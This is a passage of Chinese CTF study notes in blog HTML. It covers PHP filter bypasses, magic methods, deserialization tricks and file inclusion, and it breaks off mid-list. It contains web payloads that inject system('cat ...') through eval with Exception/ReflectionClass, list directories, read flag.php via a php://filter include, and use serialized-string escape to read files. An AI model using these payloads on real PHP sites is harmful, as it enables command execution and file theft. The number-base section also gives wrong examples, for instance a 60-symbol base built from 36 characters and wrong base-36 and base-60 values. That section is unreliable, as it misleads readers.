class="number">20</span>（十进制）。</span><br><span class="line"></span><br><span class="line">    六进制（Senary）：使用<span class="number">0</span>、<span class="number">1</span>、<span class="number">2</span>、<span class="number">3</span>、<span class="number">4</span>和<span class="number">5</span>六个数字表示。在一些人工语言和密码学中使用。例如：<span class="number">25</span>（六进制）表示<span class="number">17</span>（十进制）。</span><br><span class="line"></span><br><span class="line">    八进制（Octal）：使用<span class="number">0</span>到<span class="number">7</span>共八个数字表示。在计算机编程中经常使用，特别是在表示文件权限和转换二进制数据时。例如：<span class="number">52</span>（八进制）表示<span class="number">42</span>（十进制）。</span><br><span class="line"></span><br><span class="line">    十进制（Decimal）：使用<span class="number">0</span>到<span class="number">9</span>共十个数字表示。是我们日常生活中最常用的进制。例如：<span class="number">123</span>（十进制）表示<span class="number">123</span>（十进制）。</span><br><span class="line"></span><br><span class="line">    十六进制（Hexadecimal）：使用<span class="number">0</span>到<span class="number">9</span>以及A到F（或a到f）共十六个数字/字符表示。在计算机科学和工程领域广泛应用，特别是在表示内存地址、颜色值和编码时。例如：<span class="number">2</span>A（十六进制）表示<span class="number">42</span>（十进制）。</span><br><span class="line"></span><br><span class="line">    三十六进制（Hexatridecimal）：使用<span class="number">0</span>到<span class="number">9</span>以及A到Z共<span class="number">36</span>个数字/字符表示。在某些场合下用于短链接、URL缩短算法等。例如：<span class="number">1</span>K（三十六进制）表示<span class="number">36</span>（十进制）。</span><br><span class="line"></span><br><span class="line">    六十进制（Sexagesimal）：使用<span class="number">0</span>到<span class="number">9</span>以及A到Z共<span class="number">60</span>个数字/字符表示。在时间、地理坐标和度量衡等领域使用。例如：<span class="number">3</span>C（六十进制）表示<span class="number">60</span>（十进制）。</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 跨越方括号限制</span></span><br><span class="line"><span class="variable">$_GET</span>[a] &lt;=&gt; (<span class="variable">$_GET</span>)&#123;a&#125;</span><br><span class="line"><span class="comment"># 跳过变量限制</span></span><br><span class="line"><span class="variable">$x</span>=_GET;<span class="variable">$$x</span>[a] &lt;=&gt;<span class="variable">$_GET</span>[a]</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 异常处理类绕过</span></span><br><span class="line">    <span class="comment">#?v1=Exception&amp;v2=system(&#x27;cat fl36dg.txt&#x27;) </span></span><br><span class="line">	<span class="comment">#?v1=Reflectionclass&amp;v2=system(&#x27;cat fl36dg.txt&#x27;)</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 读取文件列表</span></span><br><span class="line"><span class="comment"># ?v1=FilesystemIterator&amp;v2=getcwd</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;<span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;<span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 动态变量执行</span></span><br><span class="line">$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;	$()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 无括号分号空格插入读取文件</span></span><br><span class="line"><span class="variable">$nice</span>=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]<span class="meta">?&gt;</span>&amp;url=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># PHP超全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_SERVER</span>：存储了服务器和执行环境的信息，如请求头、URL 信息、服务器信息等。</span><br><span class="line"><span class="variable">$_GET</span>：存储了通过 URL 查询字符串传递的参数。</span><br><span class="line"><span class="variable">$_POST</span>：存储了通过 POST 方法提交的表单数据。</span><br><span class="line"><span class="variable">$_REQUEST</span>：存储了通过 GET、POST 和 COOKIE 方式传递的参数。</span><br><span class="line"><span class="variable">$_COOKIE</span>：存储了客户端发送的 HTTP Cookie。</span><br><span class="line"><span class="variable">$_SESSION</span>：存储了与用户会话相关的变量，需要先通过 <span class="title function_ invoke__">session_start</span>() 开启会话才能使用。</span><br><span class="line"><span class="variable">$_FILES</span>：存储了通过文件上传机制上传的文件信息。</span><br><span class="line"><span class="variable">$GLOBALS</span>: 唯一一个不使用下划线的全局变量</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 玄学的全等与等于的问题</span></span><br><span class="line"><span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span></span><br><span class="line">    <span class="comment"># $num=%0c36</span></span><br><span class="line">    <span class="comment"># 0c是换页符/f，第一个会把$num当做字符串匹配，第二个会把$num当作36匹配</span></span><br><span class="line">    <span class="comment"># 如果觉得不清晰，可以尝试把$num直接强转数字就得到36了</span></span><br></pre></td></tr></table></figure>

<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><h3 id="依赖函数"><a href="#依赖函数" class="headerlink" title="依赖函数"></a>依赖函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>()			<span class="comment"># 序列化函数</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>()		<span class="comment"># 反序列化函数</span></span><br></pre></td></tr></table></figure>

<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><ol>
<li>构造函数 <strong>__construct</strong> (CTF常见)</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。 </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$x</span>,<span class="variable">$y</span> = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;x = <span class="variable">$x</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;y = <span class="variable">$y</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Point</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment"># 输出：O:5:&quot;Point&quot;:2:&#123;s:1:&quot;x&quot;;i:1;s:1:&quot;y&quot;;i:2;&#125;</span></span><br><span class="line"><span class="comment"># 构造函数在创建类的时候初始化了某个值</span></span><br><span class="line"><span class="comment"># 假设没有构造函数，会变成这样：</span></span><br><span class="line"><span class="comment"># $a = new Point(1,2); =&gt; $a = new Point;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>析构函数 <strong>__destruct</strong>() (CTF常见)</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;<span class="keyword">echo</span>(<span class="string">&#x27;你创建的类已被销毁&#x27;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Point</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment"># 返回：O:5:&quot;Point&quot;:2:&#123;s:1:&quot;x&quot;;i:1;s:1:&quot;y&quot;;i:2;&#125;你创建的类已被销毁</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>方法重载 <strong>__call</strong> &amp; <strong>__callStatic</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">static</span>::<span class="title function_ invoke__">who</span>();</span><br><span class="line">                A::<span class="title function_ invoke__">who</span>();</span><br><span class="line">                <span class="built_in">self</span>::<span class="title function_ invoke__">who</span>();</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">who</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *私有方法</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">test2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;A static&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;A call&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br><span class="line">A::<span class="title function_ invoke__">test1</span>();</span><br><span class="line"><span class="variable">$a</span></span><br><span class="line"></span><br><span class="line">输出为</span><br><span class="line"></span><br><span class="line"><span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;A call&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;A call&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;A call&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;A call&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;A static&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;A call&quot;</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>属性重载  <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a> 、 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a> 、 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a> 、 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a> </li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在给不可访问（protected 或 private）或不存在的属性赋值时，__set() 会被调用。</span></span><br><span class="line"><span class="comment">#读取不可访问（protected 或 private）或不存在的属性的值时，__get() 会被调用。</span></span><br><span class="line"><span class="comment">#当对不可访问（protected 或 private）或不存在的属性调用 isset() 或 empty() 时，__isset() 会被调用。</span></span><br><span class="line"><span class="comment">#当对不可访问（protected 或 private）或不存在的属性调用 unset() 时，__unset() 会被调用。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数 $name 是指要操作的变量名称。__set() 方法的 $value 参数指定了 $name 变量的值。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 属性重载只能在对象中进行。在静态方法中，这些魔术方法将不会被调用。所以这些方法都不能被 声明为 static。将这些魔术方法定义为 static 会产生一个警告。</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PropertyTest</span> </span>&#123;</span><br><span class="line">     <span class="comment">/**  被重载的数据保存在此  */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">     <span class="comment">/**  重载不能被用在已经定义的属性  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$declared</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/**  只有从类外部访问这个属性时，重载才会发生 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$hidden</span> = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Setting &#x27;<span class="subst">$name</span>&#x27; to &#x27;<span class="subst">$value</span>&#x27;\n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Getting &#x27;<span class="subst">$name</span>&#x27;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$trace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">        <span class="title function_ invoke__">trigger_error</span>(</span><br><span class="line">            <span class="string">&#x27;Undefined property via __get(): &#x27;</span> . <span class="variable">$name</span> .</span><br><span class="line">            <span class="string">&#x27; in &#x27;</span> . <span class="variable">$trace</span>[<span class="number">0</span>][<span class="string">&#x27;file&#x27;</span>] .</span><br><span class="line">            <span class="string">&#x27; on line &#x27;</span> . <span class="variable">$trace</span>[<span class="number">0</span>][<span class="string">&#x27;line&#x27;</span>],</span><br><span class="line">            E_USER_NOTICE);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Is &#x27;<span class="subst">$name</span>&#x27; set?\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$name</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Unsetting &#x27;<span class="subst">$name</span>&#x27;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**  非魔术方法  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHidden</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hidden;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">PropertyTest</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span>-&gt;a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;a . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">isset</span>(<span class="variable">$obj</span>-&gt;a));</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$obj</span>-&gt;a);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">isset</span>(<span class="variable">$obj</span>-&gt;a));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;declared . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Let&#x27;s experiment with the private property named &#x27;hidden&#x27;:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Privates are visible inside the class, so __get() not used...\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">getHidden</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Privates not visible outside of class, so __get() is used...\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;hidden . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>属性重载目前没遇到过。</p>
<ol start="5">
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep">_sleep()</a> 和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">__wakeup()</a> <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#language.oop5.magic.sleep">¶</a>(CTF常见)</li>
</ol>
<p>一个是在序列化前被调用，一个是在反序列化前被调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。</span></span><br><span class="line"><span class="comment"># 如果存在，该方法会先被调用，然后才执行序列化操作。</span></span><br><span class="line"><span class="comment"># 此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</span></span><br><span class="line"><span class="comment"># 如果该方法未返回任何内容，则 null 被序列化，并产生一个 E_NOTICE 级别的错误</span></span><br><span class="line"><span class="comment"># __sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 与之相反，unserialize() 会检查是否存在一个 __wakeup() 方法。</span></span><br><span class="line"><span class="comment"># 如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</span></span><br><span class="line"><span class="comment"># __wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$link</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$link</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;link = <span class="variable">$link</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;序列化前&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;link&#x27;</span>) ; <span class="comment">// 返回需要被序列化的属性列表</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;反序列化前&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Connection</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回</span></span><br><span class="line">序列化前<span class="keyword">string</span>(<span class="number">49</span>) <span class="string">&quot;O:10:&quot;</span>Connection<span class="string">&quot;:1:&#123;s:4:&quot;</span>link<span class="string">&quot;;s:9:&quot;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&quot;;&#125;&quot;</span></span><br><span class="line">反序列化前<span class="keyword">object</span>(Connection)<span class="comment">#2 (1) &#123;</span></span><br><span class="line">  [<span class="string">&quot;link&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="魔术方法的绕过"><a href="#魔术方法的绕过" class="headerlink" title="魔术方法的绕过"></a>魔术方法的绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">当成员属性数目大于实际数目时,可绕过wakeup</span><br></pre></td></tr></table></figure>

<h3 id="垃圾回收机制-反序列化之字符逃逸"><a href="#垃圾回收机制-反序列化之字符逃逸" class="headerlink" title="垃圾回收机制,反序列化之字符逃逸"></a>垃圾回收机制,反序列化之字符逃逸</h3><p>提前完结反序列化字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取的核心是利用这个去读取</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line"><span class="comment">// 利用的核心是反序列化的垃圾回收机制</span></span><br><span class="line"><span class="comment"># 垃圾回收机制如下：</span></span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;red&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;33123&quot;</span>;&#125;</span><br><span class="line"><span class="comment"># 1.假设flag前面就限定为数字4，一旦flag超出4位，那么后面多余的字符串将被抛弃。</span></span><br><span class="line"><span class="comment"># 2.假设 `s:5:&quot;33123&quot;;&#125;;` 后面还有东西，但是 `a:2&#123;` 的数字2恒不变，那么这个a所包裹的大括号后面的东西将被舍弃</span></span><br><span class="line">    <span class="comment"># a:2:&#123;s:4:&quot;flag&quot;;s:1:&quot;1&quot;;s:3:&quot;red&quot;;s:5:&quot;33123&quot;;&#125;   =运行读取=&gt;  a:2:&#123;s:4:&quot;flag&quot;;s:1:&quot;1&quot;;s:3:&quot;red&quot;;s:5:&quot;33123&quot;;&#125;</span></span><br><span class="line">    <span class="comment"># a:2:&#123;s:4:&quot;flag&quot;;s:1:&quot;1&quot;;s:3:&quot;red&quot;;s:5:&quot;33123&quot;;&#125;;s:3:&#x27;read&#x27;;s:6:&#x27;reading&#x27;&#125;;   =运行读取=&gt;  a:2:&#123;s:4:&quot;flag&quot;;s:1:&quot;1&quot;;s:3:&quot;red&quot;;s:5:&quot;33123&quot;;&#125;</span></span><br><span class="line"><span class="comment"># 反序列化的原因是要将后面出现的img变量序列化给删除了</span></span><br><span class="line"><span class="comment">// 序列化后的文本会直接跳过序列化的这个过程（目前观察确实是这样子，并且是同一变量session的情况下。）</span></span><br><span class="line">这次还给了我们另外一个知识，就是：</span><br><span class="line">    <span class="number">1</span>.反序列化的值是以   `;`  为分割的</span><br><span class="line">    <span class="number">2</span>.反序列化没有类似于 `=`  的绝对键值对</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    _SESSION[phpflag]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:5:&quot;qwert&quot;;&#125;&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h2><p>暂时省略</p>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="php函数包含"><a href="#php函数包含" class="headerlink" title="php函数包含"></a>php函数包含</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>()   用于设置php.ini文件的值的函数</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.<span class="keyword">include</span>：</span><br><span class="line">将指定文件包含到当前的 PHP 文件中，并在运行时解析和执行它。</span><br><span class="line">如果包含的文件不存在或出错，则会产生一个警告，并继续执行脚本。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将文件&quot;example.php&quot;包含到当前文件中</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;example.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.<span class="keyword">require</span>：</span><br><span class="line">与<span class="keyword">include</span>类似，将指定文件包含到当前的 PHP 文件中，</span><br><span class="line">但如果包含的文件不存在或出错，则会产生一个致命错误，并停止执行脚本。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将文件&quot;example.php&quot;包含到当前文件中</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;example.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.<span class="keyword">include_once</span>：</span><br><span class="line">与<span class="keyword">include</span>类似，但是只包含文件一次，</span><br><span class="line">即使多次调用<span class="keyword">include_once</span>函数，也只会包含一次文件。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 只包含一次文件&quot;example.php&quot;</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;example.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.<span class="keyword">require_once</span>：</span><br><span class="line">与<span 